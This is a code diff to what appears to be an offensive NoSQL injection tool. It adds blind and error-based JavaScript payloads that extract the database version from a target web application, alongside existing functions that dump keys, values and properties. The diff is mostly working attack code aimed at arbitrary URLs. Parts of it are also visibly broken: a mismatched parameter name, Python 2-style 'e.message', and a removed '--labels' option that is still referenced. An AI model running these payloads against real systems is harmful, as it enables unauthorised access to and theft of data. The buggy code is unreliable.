@@ -195,6 +195,17 @@ def blind_dump_keys(target_url, injection_character, blind_dump_keys, post_data,
     dump_ascii_table(keys_array,True)
     return keys_array
 
+def blind_get_db_version(target_url, injection_character, blind_dump_keys, post_data, cookies_dict, connection_timeout):
+    db_version_size_payload = injection_character + " && version().length == %SIZE_OF_RESULT% && " + injection_character + "1"
+    db_version_size=get_size_of_result(target_url, db_version_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
+    print(f"Size of db version string:{db_version_size}")
+    db_version_dump_prefix=f"Value of db version string: " 
+    db_version_value_payload = injection_character + f" && version().charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER% && " + injection_character + "1"
+    db_version_value=dump_string_value(target_url, db_version_dump_prefix, db_version_size, db_version_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
+    print("\n")
+    print(f"Version: {db_version_value}")
+    return db_version_value
+
 def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string, post_data, cookies_dict, connection_timeout):
     print("\r"+(80*" ")+"\r"+dump_prefix,end='')
     dump_value=""
@@ -268,6 +279,26 @@ def dump_properties(target_url, label_to_dump, injection_type, blind_string, pos
     print("Properties:")
     dump_ascii_table(label_properties_array,True)
     return label_properties_array
+
+def error_get_db_version(target_url, error_injection_type, post_data, cookies_dict, connection_timeout):
+    number1 = random.randint(10000,99999999)
+    number2 = random.randint(10000,99999999)
+    error_payload = error_injection_type + ";throw new Error(String.concat(" + hex(number1) + ",version()," + hex(number2) + "));" + error_injection_type + "1"
+
+    # try to inject the payloads in target_url or post_data
+    try:
+        error_result = nosql_inject(target_url, error_payload, post_data, cookies_dict, connection_timeout)
+        #print(error_result)
+
+        version_string = error_result.split(str(number1), 1)[1].split(str(number2), 1)[0]
+
+    except Exception as e:
+        print("unable to perform nosql injection!!!")
+        print(e.message)
+        sys.exit(-1)
+
+    print(f"Version: {version_string}")
+    return version_string 
 
 def error_dump_keys(target_url, error_injection_type, post_data, cookies_dict, connection_timeout):
     number1 = random.randint(10000,99999999)
@@ -407,7 +438,7 @@ try:
     parser.add_argument('-c', '--cookie', help='Request cookie', default={})
     parser.add_argument('-s', '--string', help='Blind string')
     parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
-    parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
+    parser.add_argument('-V', '--dump-db-version', help='Dump database version', action='store_true')
     parser.add_argument('-P', '--properties', help='Dump properties for label')
     #parser.add_argument('-K', '--keys', help='Dump keys', action='store_true')
     # -K/--keys: optional value; if provided without value, becomes empty string ("")
@@ -471,9 +502,15 @@ try:
         elif args.dump:
             print(f"Dumping values.\n")
             error_dump_values(target_url, requested_keys_array, error_injection_type, post_data, cookies_dict, connection_timeout)
+        elif args.dump_db_version:
+            print(f"Dumping database version.\n")
+            error_get_db_version(target_url, error_injection_type, post_data, cookies_dict, connection_timeout)
     elif blind_injection_type:
         if should_dump_keys:
             keys_array=blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+        elif args.dump_db_version:
+            print(f"Dumping database version.\n")
+            blind_get_db_version(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
     sys.exit(-1)
     if args.labels:
         print("Dumping labels....\n")
